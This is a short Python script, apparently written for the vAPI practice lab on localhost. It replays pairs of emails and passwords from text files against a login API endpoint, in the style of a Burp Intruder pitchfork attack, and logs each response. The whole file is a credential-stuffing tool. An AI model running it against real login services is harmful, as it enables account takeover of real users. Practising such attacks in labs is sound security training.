'''
Script for fuzzing 2 parameters simultaneously in a POST JSON body. Similar to Burp Intruder Pitchfork 
attack type without the Community Edition rate limit.

Proxying through Burp can be done using envrionment variables:

Powershell
$env:REQUESTS_CA_BUNDLE="Z:\PATH\TO\burpCert.pem"
$env:HTTP_PROXY="http://127.0.0.1:8080"
$env:HTTPS_PROXY="http://127.0.0.1:8080"

Bash
export REQUESTS_CA_BUNDLE="/PATH/TO/burpCert.pem"
export HTTP_PROXY="http://127.0.0.1:8080"
export HTTPS_PROXY="http://127.0.0.1:8080"
'''

import requests

target = '127.0.0.1'

def api2_post_login(email, password):
    url = f'http://{target}/vapi/api2/user/login'
    payload = {'email': email.rstrip(),'password': password.rstrip()}
    r = requests.post(url, json=payload)
    return r

with open('emails.txt', 'r') as f:
    emails = f.readlines()

with open('passwords.txt', 'r') as f:
    passwords = f.readlines()

credentials = zip(emails, passwords)

with open('results.txt', 'a') as f:
    for cred in credentials:
        e, p = cred
        response = api2_post_login(e, p)
        f.write(str(response.status_code) + ' ' + str(response.json()) + '\n')
    f.close()
